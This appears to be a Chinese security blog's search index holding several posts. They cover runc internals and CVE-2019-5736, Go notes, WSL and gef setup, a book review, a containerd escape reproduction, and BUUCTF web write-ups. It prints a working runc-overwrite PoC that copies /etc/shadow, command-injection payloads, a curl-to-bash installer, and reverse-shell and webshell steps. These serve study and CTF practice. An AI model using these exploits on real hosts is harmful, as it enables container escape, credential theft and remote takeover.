container factory based in the root directory and // configures the factory with the provided option funcs. func New(root string, options ...func(*LinuxFactory) error) (Factory, error) { if root != \"\" { if err := os.MkdirAll(root, 0o700); err != nil { return nil, newGenericError(err, SystemError) } } l := \u0026LinuxFactory{ Root: root, InitPath: \"/proc/self/exe\", // 这里的结果就 InitArgs: \"runc init\" InitArgs: []string{os.Args[0], \"init\"}, Validator: validate.New(), CriuPath: \"criu\", } Cgroupfs(l) for _, opt := range options { if opt == nil { continue } if err := opt(l); err != nil { return nil, err } } return l, nil } createContainer()函数的执行逻辑为： 调用loadFactory()函数，获取LinuxFactory类型对象 调用该类型的Create函数 所以来分析LinuxFactory类型的Create()函数，可以看到其创建了linuxContainer类型对象并将其返回。所以startContainer()函数中的container变量类型为linuxContainer（这与后续的r.run()函数有关）。 func (l *LinuxFactory) Create(id string, config *configs.Config) (Container, error) { ... c := \u0026linuxContainer{ id: id, root: containerRoot, config: config, initPath: l.InitPath, initArgs: l.InitArgs, criuPath: l.CriuPath, newuidmapPath: l.NewuidmapPath, newgidmapPath: l.NewgidmapPath, cgroupManager: l.NewCgroupsManager(config.Cgroups, nil), } ... return c, nil } r.run()函数(utils_linux.go#265)启动容器，其中包含两个关键逻辑，分别是newProcess()函数与r.container.Run()。 newProcess()函数创建逻辑上的容器进程 r.container.Run()运行该容器 在之前的分析结果中，r.container为linuxContainer，所以r.container.Run()调用的是linuxContainer.Run()方法(libcontainer/container_linux.go#273)。 func (r *runner) run(config *specs.Process) (int, error) { var err error defer func()","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:2:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#0x01-容器之外的runc进程启动"},{"categories":["源码阅读"],"content":"0x02 调用链梳理 流程图 ","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:3:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#0x02-调用链梳理"},{"categories":["源码阅读"],"content":"0x03 runc漏洞poc分析 以https://github.com/Frichetten/CVE-2019-5736-PoC为例 package main // Implementation of CVE-2019-5736 // Created with help from @singe, @_cablethief, and @feexd. // This commit also helped a ton to understand the vuln // https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d import ( \"fmt\" \"io/ioutil\" \"os\" \"strconv\" \"strings\" ) // This is the line of shell commands that will execute on the host var payload = \"#!/bin/bash \\n cat /etc/shadow \u003e /tmp/shadow \u0026\u0026 chmod 777 /tmp/shadow\" func main() { // First we overwrite /bin/sh with the /proc/self/exe interpreter path fd, err := os.Create(\"/bin/sh\") if err != nil { fmt.Println(err) return } fmt.Fprintln(fd, \"#!/proc/self/exe\") err = fd.Close() if err != nil { fmt.Println(err) return } fmt.Println(\"[+] Overwritten /bin/sh successfully\") // Loop through all processes to find one whose cmdline includes runcinit // This will be the process created by runc var found int for found == 0 { pids, err := ioutil.ReadDir(\"/proc\") if err != nil { fmt.Println(err) return } for _, f := range pids { fbytes, _ := ioutil.ReadFile(\"/proc/\" + f.Name() + \"/cmdline\") fstring := string(fbytes) if strings.Contains(fstring, \"runc\") { fmt.Println(\"[+] Found the PID:\", f.Name()) found, err = strconv.Atoi(f.Name()) if err != nil { fmt.Println(err) return } } } } // We will use the pid to get a file handle for runc on the host. var handleFd = -1 for handleFd == -1 { // Note, you do not need to use the O_PATH flag for the exploit to work. handle, _ := os.OpenFile(\"/proc/\"+strconv.Itoa(found)+\"/exe\", os.O_RDONLY, 0777) if int(handle.Fd()) \u003e 0 { handleFd = int(handle.Fd()) } } fmt.Println(\"[+] Successfully got the file handle\") // Now that we have the file handle, lets write to the runc binary and overwrite it // It will maintain it's executable flag for { writeHandle, _ := os.OpenFile(\"/proc/self/fd/\"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) if int(writeHandle.Fd()) \u003e 0 { fmt.Println(\"[+] Successfully got write handle\", writeHandle) writeHandle.Write([]byte(payload)) return } } } Poc原理介绍 改写容器中的/bin/sh文件，写入#!/proc/self/exe #!/proc/self/exe使得runc执行/bin/sh时会执行自身 在容器中找到runc进程的进程号id，也就是上述runc调用链中的runc init进程，并尝试去获取/proc/id/exe（即宿主机上的runc文件）。而runc init正在执行时，系统是不允许往runc写文件的，因此以读的方式打开 当runc init结束之后，再从/proc/self/fd中以写方式打开runc的文件描述符，写入恶意代码 /proc虚拟文件系统介绍 upload_bdd41b5b3d35080460631eed73f6de7b.png\" upload_bdd41b5b3d35080460631eed73f6de7b.png ","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:4:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#0x03-runc漏洞poc分析"},{"categories":["源码阅读"],"content":"0x04 修复代码分析 upload_0878eab4eacead51c5850593e66effdd.png\" upload_0878eab4eacead51c5850593e66effdd.png 引入的ensure_cloned_binary()函数会创建克隆的runc文件并执行fexecve()函数替换当前进程映像 //libcontainer/nsenter/cloned_binary.c int ensure_cloned_binary(void) { int execfd; char **argv = NULL; /* Check that we're not self-cloned, and if we are then bail. */ int cloned = is_self_cloned(); if (cloned \u003e 0 || cloned == -ENOTRECOVERABLE) return cloned; if (fetchve(\u0026argv) \u003c 0) return -EINVAL; //创建克隆文件 execfd = clone_binary(); if (execfd \u003c 0) return -EIO; if (putenv(CLONED_BINARY_ENV \"=1\")) goto error; fexecve(execfd, argv, environ); error: close(execfd); return -ENOEXEC; } 我们还可以在被调用的clone_binary()函数中看到克隆的逻辑： 创建新的文件 以读方式打开/proc/self/exe，也就是宿主机上的runc文件 sendfile() I/O函数将runc文件内容写入到新的文件中 返回新的文件描述符 static int clone_binary(void) { int binfd, execfd; struct stat statbuf = { }; size_t sent = 0; int fdtype = EFD_NONE; /* * Before we resort to copying, let's try creating an ro-binfd in one shot * by getting a handle for a read-only bind-mount of the execfd. */ execfd = try_bindfd(); if (execfd \u003e= 0) return execfd; /* * Dammit, that didn't work -- time to copy the binary to a safe place we * can seal the contents. */ // 创建空的克隆文件，待写入 execfd = make_execfd(\u0026fdtype); if (execfd \u003c 0 || fdtype == EFD_NONE) return -ENOTRECOVERABLE; // 这里的应该是原本的runc binfd = open(\"/proc/self/exe\", O_RDONLY | O_CLOEXEC); if (binfd \u003c 0) goto error; if (fstat(binfd, \u0026statbuf) \u003c 0) goto error_binfd; //写入内容 while (sent \u003c statbuf.st_size) { int n = sendfile(execfd, binfd, NULL, statbuf.st_size - sent); if (n \u003c 0) { /* sendfile can fail so we fallback to a dumb user-space copy. */ n = fd_to_fd(execfd, binfd); if (n \u003c 0) goto error_binfd; } sent += n; } close(binfd); if (sent != statbuf.st_size) goto error; if (seal_execfd(\u0026execfd, fdtype) \u003c 0) goto error; return execfd; error_binfd: close(binfd); error: close(execfd); return -EIO; } ","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:5:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#0x04-修复代码分析"},{"categories":["源码阅读"],"content":"参考链接 runc源码分析(一)-create和start流程-v1.0.0-rc2 runc 启动容器过程分析（附 CVE-2019-5736 实现过程） CVE-2019-5736复现及分析 CVE-2019-5736 patch ","date":"2021-04-20","objectID":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/:6:0","series":null,"tags":["Docker","Linux","Golang"],"title":"docker-runc(CVE-2019-5736)漏洞分析","uri":"/2021-04-20-runc%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90%E4%B8%8Ecve-2019-5736%E6%BA%90%E7%A0%81%E5%B0%9D%E8%AF%95%E5%88%86%E6%9E%90/#参考链接"},{"categories":["语言学习笔记"],"content":"Go的package管理与GOPATH与go modules 关于GOPATH的作用 http://c.biancheng.net/view/88.html 关于go 1.11之后引入的go mudules机制 https://geektutu.com/post/quick-golang.html#9-%E5%8C%85-Package-%E5%92%8C%E6%A8%A1%E5%9D%97-Modules 上述两个链接中的内容讲得还不错。看一遍下来，感觉GOPATH就是过去的go用来管理组织项目的不同包的方式，而go modules是新的管理包的方式。在一个目录下执行go mod init packagename之后，就可以方便地引用该目录下的包。 ","date":"2021-04-05","objectID":"/2021-04-05-golang-notes/:1:0","series":null,"tags":["Golang"],"title":"Golang notes","uri":"/2021-04-05-golang-notes/#go的package管理与gopath与go-modules"},{"categories":["语言学习笔记"],"content":"Go的interface学习 首先给出interface的定义语法： type inter1 interface { func1(x int)(int, error) } interface是一种抽象的类型，可以看作对一种规范的定义。接口定义的函数就是满足这种规范的具体类型所需要实现的方法。 接口一般被用在函数参数里，提供一种抽象的函数对接 比如，一个函数定义如下： func userFunction(i inter1)(int error){ ... } 那么对于实现了这个接口的类型，如： type s1 struct { ... } func (s s1) func1(x int) (int, error) { ... } 我们就能够将s1类型的变量作为参数传入userFunction()中 需要注意的是，一种接口的所有方法被一种具体类型所实现，才能说这种类型实现了这个接口 测试代码 package main import \"fmt\" type pVal struct { val int } func (p pVal) fun() (int, error) { if p.val \u003e 0 { return p.val, nil } else { return -1, fmt.Errorf(\"p.val 小于0: %d\", p.val) } } //接口定义了一种规范、约定 type testInter interface { fun() (int, error) fun2() (int, error) } func userFunction(s testInter) int { res, err := s.fun() //error handle if err != nil { fmt.Println(err) return -1 } return res } func main() { v1 := pVal{-1} fmt.Printf(\"type: %T\\n\", v1) res := userFunction(v1) fmt.Println(res) //接口的第二种用法 var interVal testInter interVal = v1 interVal.fun() } ","date":"2021-04-05","objectID":"/2021-04-05-golang-notes/:2:0","series":null,"tags":["Golang"],"title":"Golang notes","uri":"/2021-04-05-golang-notes/#go的interface学习"},{"categories":["语言学习笔记"],"content":"Go的interface学习 首先给出interface的定义语法： type inter1 interface { func1(x int)(int, error) } interface是一种抽象的类型，可以看作对一种规范的定义。接口定义的函数就是满足这种规范的具体类型所需要实现的方法。 接口一般被用在函数参数里，提供一种抽象的函数对接 比如，一个函数定义如下： func userFunction(i inter1)(int error){ ... } 那么对于实现了这个接口的类型，如： type s1 struct { ... } func (s s1) func1(x int) (int, error) { ... } 我们就能够将s1类型的变量作为参数传入userFunction()中 需要注意的是，一种接口的所有方法被一种具体类型所实现，才能说这种类型实现了这个接口 测试代码 package main import \"fmt\" type pVal struct { val int } func (p pVal) fun() (int, error) { if p.val 0 { return p.val, nil } else { return -1, fmt.Errorf(\"p.val 小于0: %d\", p.val) } } //接口定义了一种规范、约定 type testInter interface { fun() (int, error) fun2() (int, error) } func userFunction(s testInter) int { res, err := s.fun() //error handle if err != nil { fmt.Println(err) return -1 } return res } func main() { v1 := pVal{-1} fmt.Printf(\"type: %T\\n\", v1) res := userFunction(v1) fmt.Println(res) //接口的第二种用法 var interVal testInter interVal = v1 interVal.fun() } ","date":"2021-04-05","objectID":"/2021-04-05-golang-notes/:2:0","series":null,"tags":["Golang"],"title":"Golang notes","uri":"/2021-04-05-golang-notes/#测试代码"},{"categories":["环境配置系列"],"content":" 前提条件： windows10 安装好的wsl2（我的linux版本是ubuntu20.04) vscode ","date":"2021-04-04","objectID":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/:0:0","series":null,"tags":["Golang"],"title":"windows10+wsl2+VsCode配置go开发环境","uri":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/#"},{"categories":["环境配置系列"],"content":"0x00 在wsl2中安装go 去官网下载最新的go文件包，然后解压安装到/usr/local目录 $ sudo tar -C /usr/local -xzf go1.16.3.linux-amd64.tar.gz 添加环境变量到~/.profile中（一开始我只添加了第一行的PATH内容，结果后面打开VsCode之后提示安装的go工具失败，所以又加上了goproxy内容。 export PATH=$PATH:/usr/local/go/bin export GOPROXY=https://goproxy.cn 因为我把wsl中的默认终端改成了zsh，所以需要在.zshrc中添加上述两行，然后执行source .zshrc。如果是写在.profile中的话，每次打开终端并不会加载其中的内容。 ","date":"2021-04-04","objectID":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/:1:0","series":null,"tags":["Golang"],"title":"windows10+wsl2+VsCode配置go开发环境","uri":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/#0x00-在wsl2中安装go"},{"categories":["环境配置系列"],"content":"0x01 创建项目文件夹 随便创建一个文件夹，并且在其中创建一个go文件。 ","date":"2021-04-04","objectID":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/:2:0","series":null,"tags":["Golang"],"title":"windows10+wsl2+VsCode配置go开发环境","uri":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/#0x01-创建项目文件夹"},{"categories":["环境配置系列"],"content":"0x02 VsCode配置 首先给VsCode安装wsl插件，然后用VsCode打开刚才创建的文件夹，点击打开go文件，然后会跳出安装go插件和相关工具的提示。 正常来说工具安装会出问题，但是在写入了GOPROXY之后就可以解决。虽然我之前在windows上也尝试过了诸多方法来解决这一问题，但是感觉始终没有顺利解决，这次在wsl中竟如此顺利，也不知道是不是系统的原因。 go/bin目录\" go/bin目录 Anyway, 安装好这些工具之后，就可以开始开发了 :-)。 ","date":"2021-04-04","objectID":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/:3:0","series":null,"tags":["Golang"],"title":"windows10+wsl2+VsCode配置go开发环境","uri":"/2021-04-04-windows10-wsl2-vscode%E9%85%8D%E7%BD%AEgo%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/#0x02-vscode配置"},{"categories":["阅读"],"content":"第一次读《白夜行》应该是在高一的时候，当时同学们手中有一本，所以就借来看过。几年过去了，我对于书中的内容早已记不太清，只记得大概是个悲惨的凶手的故事。今年寒假在家的时候和别人聊到了东野圭吾，于是又从网上下载了《白夜行》的mobi文件，重新开始了阅读。 第二遍的阅读应该是比第一遍读得更加顺利、记忆更加深刻的（从我现在还能记起书中的主要故事情节就能知道）。毫无疑问，这是一个令人悲伤的故事。书中的两个主人公，唐泽雪穗与桐原亮司，都是非常悲剧性的人物。童年时代遭遇的苦难和打击，使得他们就像光与暗一般，互相依靠，互相帮助，通过自己对这个世界的残忍手段来努力活着。书中的警察笹垣润三（笹：tì）将他们形容为枪虾与虾虎鱼两种动物，互相帮助，生存在弱肉强食的自然界。 虽然犯罪是因为小时候的苦难，但犯罪终究是犯罪。所以，东野圭吾在书中也交代了象征性的正义获胜的结局，活在暗处的桐原亮司在书中的警察的追捕下选择了畏罪自杀，以自己的生命换取雪穗的平安无事。他把一切罪恶与黑暗都带在自己身上，然后结束于从高楼的纵身一跃中。亮司应该是喜欢雪穗的，或许他们小时候只是单纯的好友关系，但是在一些事情发生之后，他和雪穗的心态都发生了巨大变化，因此他能够心甘情愿地为雪穗付出。当然，雪穗也不是什么单纯弱小的受害者，她在书中是一个外表光鲜亮丽的女人，她懂得利用自己的这方面优势来谋取利益。而且我觉得，可能是雪穗主动找亮司合作的，各种大方向上的决定也是她完成的。这样的一个女人如果在现实世界中存在的话，那肯定非常令人可怕。 一天当中，有太阳升起的时候，也有下沉的时候。人生也一样，有白天和黑夜，只是不会像真正的太阳那样，有定时的日出和日落。看个人，有些人一辈子都活在太阳的照耀下，也有些人不得不一直活在漆黑的深夜里。人害怕的，就是本来一直存在的太阳落下不再升起，也就是非常害怕原本照在身上的光芒消失。 我的天空里没有太阳，总是黑夜，但并不暗，因为有东西代替了太阳。虽然没有太阳那么明亮，但对我来说已经足够。凭借着这份光，我便能把黑夜当成白天。你明白吗？我从来就没有太阳，所以不怕失去。 这是书中雪穗对自己的店员说的一句话（如果我没记错的话），听起来有种悲悯而又令人生畏的感觉。也正是因为她从来就不觉得自己拥有太阳，所以她能够不顾一切地去达到自己的目的。 书的封面图案是一张剪纸，剪纸的模样是一个小男孩与小女孩牵手的样子，也就是亮司与雪穗小时候的场景。读完整本书再看到这一封面的时候，确实有种意味深长的感觉啊。书中一切恶的来源，就是大人对小孩犯下的罪恶。在罪恶与黑暗的环境中成长的人，也许真的注定了一生都无法拥有美好的太阳。白夜之行，令人惋惜。 白夜行cover \" 白夜行 ","date":"2021-03-17","objectID":"/2021-03-17-%E9%87%8D%E8%AF%BB%E7%99%BD%E5%A4%9C%E8%A1%8C/:0:0","series":null,"tags":["Life","Reading"],"title":"重读白夜行","uri":"/2021-03-17-%E9%87%8D%E8%AF%BB%E7%99%BD%E5%A4%9C%E8%A1%8C/#"},{"categories":["工具配置"],"content":" 对于配置完全且好用的工具，真是没有抵抗力。。。 ","date":"2021-03-15","objectID":"/2021-03-15-%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%8Bwsl2-ubuntu20%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8Agef%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/:0:0","series":null,"tags":["Linux","WSL"],"title":"wsl2-ubuntu20安装以及gef调试工具安装","uri":"/2021-03-15-%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%8Bwsl2-ubuntu20%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8Agef%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/#"},{"categories":["工具配置"],"content":"Let’s start exploiting! 首先，开启你的windows系统中的wsl。打开windows功能，勾选以下两项 image-20210315202713474image-20210315202713474 \" image-20210315202713474 Powershell输入wsl -l -v查看wsl版本，如果是1的话还需要升级到2。按照微软的文档，下载升级程序并点击安装即可 接下来选择ubuntu20作为待安装的Linux版本，在Microsoft Store中搜索并安装即可 初始化ubuntu并且设置用户名密码 执行以下命令更新源 $ sudo apt update $ sudo apt upgrade 安装gdb $ sudo apt install gdb 安装gef，这里我尝试curl，wget都不行，会卡住，但是明明网站是可以访问的，没办法只要复制网站内容然后粘贴到自己创建的.gdbinit-gef.py文件中，然后source写入。以下是官方给出的几种安装方式 # via the install script ## using curl $ bash -c \"$(curl -fsSL http://gef.blah.cat/sh)\" ## using wget $ bash -c \"$(wget http://gef.blah.cat/sh -O -)\" # or manually $ wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py $ echo source ~/.gdbinit-gef.py \u003e\u003e ~/.gdbinit # or alternatively from inside gdb directly $ gdb -q (gdb) pi import urllib.request as u, tempfile as t; g=t.NamedTemporaryFile(suffix='-gef.py'); open(g.name, 'wb+').write(u.urlopen('https://tinyurl.com/gef-master').read()); gdb.execute('source %s' % g.name) 如果一切无误的话，启动gdb，你会看到以下内容: image-20210315203732185image-20210315203732185 \" image-20210315203732185 打开一个文件看看，beautiful and elegant image-20210315204035474image-20210315204035474 \" image-20210315204035474 ","date":"2021-03-15","objectID":"/2021-03-15-%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%8Bwsl2-ubuntu20%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8Agef%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/:0:1","series":null,"tags":["Linux","WSL"],"title":"wsl2-ubuntu20安装以及gef调试工具安装","uri":"/2021-03-15-%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%8Bwsl2-ubuntu20%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8Agef%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85/#lets-start-exploiting"},{"categories":["实践记录"],"content":" 环境信息： leo@leo-ubuntu1604:~$ uname -a Linux leo-ubuntu1604 4.15.0-112-generic #113~16.04.1-Ubuntu SMP Fri Jul 10 04:37:08 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux leo@leo-ubuntu1604:~$ lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 16.04.7 LTS Release: 16.04 Codename: xenial Docker: 19.03.8 Containerd: 1.3.7 Poc: https://github.com/cdk-team/CDK/releases/download/v0.1.10/cdk_linux_amd64 ","date":"2021-03-04","objectID":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:0","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列5 CVE-2020-15257 containerd漏洞逃逸","uri":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#"},{"categories":["实践记录"],"content":"0x00 安装docker以及containerd 安装apt的相关依赖包 sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common 添加Docker的GPG密钥，更新源 curl -fsSL https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg | sudo apt-key add - sudo apt-get update 安装指定版本的docker sudo apt-get install docker-ce=5:19.03.8~3-0~ubuntu-xenial 安装指定版本的containerd sudo apt install containerd.io=1.3.7-1 查看docker以及containerd版本信息 image-20210304163353618image-20210304163353618 \" image-20210304163353618 ","date":"2021-03-04","objectID":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:1","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列5 CVE-2020-15257 containerd漏洞逃逸","uri":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#0x00-安装docker以及containerd"},{"categories":["实践记录"],"content":"0x01 创建容器 运行一个容器并且在其中下载最新版本的poc sudo docker run -it --net=host ubuntu:18.04 /bin/bash # 注意因为 --net=host参数，创建的容器的主机名将是宿主机名称，而不是一段哈希值 sudo docker cp /home/leo/Downloads/cdk_linux_amd64 3579:/home/tmpPoc ","date":"2021-03-04","objectID":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:2","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列5 CVE-2020-15257 containerd漏洞逃逸","uri":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#0x01-创建容器"},{"categories":["实践记录"],"content":"0x02 下载Poc执行攻击 进入到容器后使用cdk工具产生远程shell。 image-20210304164159822image-20210304164159822 \" image-20210304164159822 远程主机监听到shell，并且具有root权限。 image-20210304164122514image-20210304164122514 \" image-20210304164122514 ","date":"2021-03-04","objectID":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:3","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列5 CVE-2020-15257 containerd漏洞逃逸","uri":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#0x02-下载poc执行攻击"},{"categories":["实践记录"],"content":"参考链接： https://xz.aliyun.com/t/8925#toc-0 https://www.freebuf.com/vuls/261962.html ","date":"2021-03-04","objectID":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/:0:4","series":null,"tags":["Linux","Docker"],"title":"Docker逃逸系列5 CVE-2020-15257 containerd漏洞逃逸","uri":"/2021-03-04-docker%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%975-cve-2020-15257-containerd%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8/#参考链接"},{"categories":["CTF"],"content":"0x08 [GXYCTF2019]Ping Ping Ping 题目链接 相关知识点： Linux命令执行注入 $IFS$9绕过空格过滤 输入?ip=127.0.0.1;cat$IFS$9index.php查看index.php内容。image-20210302171046322image-20210302171046322 \" image-20210302171046322 使用$IFS$9绕过空格，输入以下内容，将ls的结果作为cat命令的参数，查看flag.php和index.php内容。 ?ip=127.0.0.1;cat$IFS$9`ls` 注意网页上没有直接显示flag，flag藏在注释里。 image-20210303102314755image-20210303102314755 \" image-20210303102314755 参考链接： https://ctf.ieki.xyz/buuoj/gxyctf-2019.html https://www.cnblogs.com/eshizhan/archive/2011/11/30/2269325.html ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:1:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x08-gxyctf2019ping-ping-ping"},{"categories":["CTF"],"content":"0x09 [ACTF2020 新生赛]Exec 题目链接 同样是命令注入 这题更加简单。首先输入127.0.0.1;ls看一下有什么文件。 pingping \" ping 然后查看index.php文件内容。因为如果直接cat index.php的话，会被浏览器解释并执行，所以无法看到文件原本的内容。于是，可以在外面包上一层html注释。 127.0.0.1;echo '\u003c!--'`cat index.php`'--\u003e' 查看网页源代码，可以获得index.php文件的内容。 \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\" /\u003e \u003ctitle\u003ecommand execution\u003c/title\u003e \u003clink href=\"http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css\" rel=\"stylesheet\" /\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003ePING\u003c/h1\u003e \u003cform class=\"form-inline\" method=\"post\"\u003e \u003cdiv class=\"input-group\"\u003e \u003cinput style=\"width: 280px\" id=\"target\" type=\"text\" class=\"form-control\" placeholder=\"请输入需要ping的地址\" aria-describedby=\"basic-addon1\" name=\"target\" /\u003e \u003c/div\u003e \u003cbr /\u003e \u003cbr /\u003e \u003cbutton style=\"width: 280px\" class=\"btn btn-default\"\u003ePING\u003c/button\u003e \u003c/form\u003e \u003cbr /\u003e \u003cpre\u003e \u003c?php if (isset($_POST['target'])) { system(\"ping -c 3 \" . $_POST['target']); } ?\u003e\u003c/pre\u003e \u003c/body\u003e \u003c/html\u003e 显然，网页对于用户的输入没有做出任何过滤。于是我们用find工具找出flag的位置(/flag)并且直接显示即可。 127.0.0.1;find / -name flag* /* .... ... /flag */ cat /flag ps：这是第一个我没看任何wp自己写出的web题😭，不容易啊 ","date":"2021-03-02","objectID":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/:2:0","series":null,"tags":["CTF","web"],"title":"BUUCTF web记录 2","uri":"/2021-03-02-buuctf-web%E8%AE%B0%E5%BD%95-2/#0x09-actf2020-新生赛exec"},{"categories":["CTF"],"content":"0x10 [极客大挑战 2019]Knife 题目链接 网页标题直接告诉你这是白给的shell，再看到eval一句话木马，就明白这是webshell。 image-20210304110445313image-20210304110445313 \" image-20210304110445313 用蚁剑直接输入网页地址和密码Syc尝试连接，虽然终端里find / -name flag没有找到结果，但是在图形界面里发现根目录下存在flag文件，直接白给。不过奇怪的是为什么命令行find没有找到？ image-20210304111608479image-20210304111608479 \" image-20210304111608479 